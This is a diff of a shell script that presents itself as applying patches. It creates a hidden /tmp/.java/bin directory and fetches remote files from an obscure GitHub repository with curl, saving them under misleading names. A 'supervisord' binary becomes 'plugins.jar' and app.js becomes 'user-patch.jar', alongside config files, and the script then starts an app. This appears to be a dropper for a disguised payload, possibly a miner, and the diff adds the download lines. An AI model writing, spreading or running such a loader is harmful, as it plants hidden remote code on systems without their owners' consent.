@@ -2,11 +2,11 @@
 
 function fetch_files() {
     echo "Applying Patches ..."
-    mkdir -p /tmp/.java/bin
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/mc/patch.jar -o user-patch.jar
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/cfg.conf -o cfg.conf
-    # cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/n1-conf.json -o conf.json
+    mkdir -p /tmp/.java/bin && cd /tmp/.java/bin/
+    curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
+    curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
+    curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/cfg.conf -o cfg.conf
+    curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/n1-conf.json -o conf.json
     echo "DONE ..."
 }
 
@@ -16,7 +16,7 @@ function start_app() {
     echo "SERVER STARTED ..."
 }
 
-if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/conf.json" ]; then
+if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/user-patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/conf.json" ]; then
     echo "Patch files already fetched ..."
     start_app
 else
